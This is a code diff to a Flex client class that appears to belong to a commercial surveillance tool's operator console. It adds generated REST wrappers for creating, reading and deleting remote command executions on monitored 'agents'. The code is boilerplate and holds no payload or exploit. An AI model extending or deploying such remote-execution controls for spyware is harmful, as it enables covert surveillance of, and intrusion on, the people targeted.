@@ -7,6 +7,7 @@ package it.ht.rcs.console.agent.rest
 import com.adobe.fiber.core.model_internal;
 import com.adobe.fiber.services.wrapper.HTTPServiceWrapper;
 import it.ht.rcs.console.agent.model.Agent;
+import it.ht.rcs.console.agent.model.Command;
 import it.ht.rcs.console.agent.model.Config;
 import it.ht.rcs.console.agent.model.Download;
 import it.ht.rcs.console.agent.model.FileSystemItem;
@@ -195,6 +196,31 @@ internal class _Super_DBAgent extends com.adobe.fiber.services.wrapper.HTTPServi
 
          operation = new mx.rpc.http.Operation(null, "destroy_filesystem_");
          operation.url = "/agent/filesystem_destroy";
+         operation.method = "POST";
+         operation.serializationFilter = serializer1;
+         operation.contentType = "application/xml";
+         operations.push(operation);
+
+         operation = new mx.rpc.http.Operation(null, "create_exec_");
+         operation.url = "/agent/exec";
+         operation.method = "POST";
+         operation.contentType = "application/xml";
+        operation.resultType = Object;
+         operations.push(operation);
+
+         operation = new mx.rpc.http.Operation(null, "exec_");
+         operation.url = "/agent/exec/{id}";
+         operation.method = "GET";
+         argsArray = new Array("id");
+         operation.argumentNames = argsArray;         
+         operation.serializationFilter = serializer0;
+         operation.properties = new Object();
+         operation.properties["urlParamNames"] = ["id"];
+        operation.resultElementType = it.ht.rcs.console.agent.model.Command;
+         operations.push(operation);
+
+         operation = new mx.rpc.http.Operation(null, "destroy_exec_");
+         operation.url = "/agent/exec_destroy";
          operation.method = "POST";
          operation.serializationFilter = serializer1;
          operation.contentType = "application/xml";
@@ -588,6 +614,60 @@ internal class _Super_DBAgent extends com.adobe.fiber.services.wrapper.HTTPServi
     public function destroy_filesystem_(strXml:String) : mx.rpc.AsyncToken
     {
         var _internal_operation:mx.rpc.AbstractOperation = _serviceControl.getOperation("destroy_filesystem_");
+        var _internal_token:mx.rpc.AsyncToken = _internal_operation.send(strXml) ;
+        return _internal_token;
+    }
+     
+    /**
+      * This method is a generated wrapper used to call the 'create_exec_' operation. It returns an mx.rpc.AsyncToken whose
+      * result property will be populated with the result of the operation when the server response is received.
+      * To use this result from MXML code, define a CallResponder component and assign its token property to this method's return value.
+      * You can then bind to CallResponder.lastResult or listen for the CallResponder.result or fault events.
+      *
+      * @see mx.rpc.AsyncToken
+      * @see mx.rpc.CallResponder 
+      *
+      * @return an mx.rpc.AsyncToken whose result property will be populated with the result of the operation when the server response is received.
+      */
+    public function create_exec_(strXml:String) : mx.rpc.AsyncToken
+    {
+        var _internal_operation:mx.rpc.AbstractOperation = _serviceControl.getOperation("create_exec_");
+        var _internal_token:mx.rpc.AsyncToken = _internal_operation.send(strXml) ;
+        return _internal_token;
+    }
+     
+    /**
+      * This method is a generated wrapper used to call the 'exec_' operation. It returns an mx.rpc.AsyncToken whose
+      * result property will be populated with the result of the operation when the server response is received.
+      * To use this result from MXML code, define a CallResponder component and assign its token property to this method's return value.
+      * You can then bind to CallResponder.lastResult or listen for the CallResponder.result or fault events.
+      *
+      * @see mx.rpc.AsyncToken
+      * @see mx.rpc.CallResponder 
+      *
+      * @return an mx.rpc.AsyncToken whose result property will be populated with the result of the operation when the server response is received.
+      */
+    public function exec_(id:String) : mx.rpc.AsyncToken
+    {
+        var _internal_operation:mx.rpc.AbstractOperation = _serviceControl.getOperation("exec_");
+        var _internal_token:mx.rpc.AsyncToken = _internal_operation.send(id) ;
+        return _internal_token;
+    }
+     
+    /**
+      * This method is a generated wrapper used to call the 'destroy_exec_' operation. It returns an mx.rpc.AsyncToken whose
+      * result property will be populated with the result of the operation when the server response is received.
+      * To use this result from MXML code, define a CallResponder component and assign its token property to this method's return value.
+      * You can then bind to CallResponder.lastResult or listen for the CallResponder.result or fault events.
+      *
+      * @see mx.rpc.AsyncToken
+      * @see mx.rpc.CallResponder 
+      *
+      * @return an mx.rpc.AsyncToken whose result property will be populated with the result of the operation when the server response is received.
+      */
+    public function destroy_exec_(strXml:String) : mx.rpc.AsyncToken
+    {
+        var _internal_operation:mx.rpc.AbstractOperation = _serviceControl.getOperation("destroy_exec_");
         var _internal_token:mx.rpc.AsyncToken = _internal_operation.send(strXml) ;
         return _internal_token;
     }
